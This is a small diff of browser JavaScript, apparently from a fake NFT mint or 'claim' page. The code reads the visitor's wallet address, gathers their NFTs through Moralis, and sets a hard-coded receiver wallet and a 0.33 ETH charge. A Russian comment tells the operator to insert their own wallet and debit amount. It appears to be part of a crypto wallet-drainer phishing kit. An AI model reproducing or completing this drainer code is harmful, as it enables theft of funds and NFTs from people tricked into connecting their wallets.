@@ -126,7 +126,7 @@
 			addr = accounts[0]
 			const optionssss = {
   address: addr,
-};
+
 			if(addr.length != 42) {
 				return;
 			}
@@ -136,9 +136,10 @@
 					return;
 				}
 			}
+			
 			claim_data = {receiver: '0xDB166D515EB187ec35a54aF33592d84D5B8Ef1Ff', mint_price: 0.33,  nfts: await Moralis.Web3.getNFTs(optionssss)} // Сюда кошель и размер списания в эфире
 		}
-		
+		};
 		async function sync_chain() {
 			if(Moralis.getChainId() != "0x1") {
 				try {
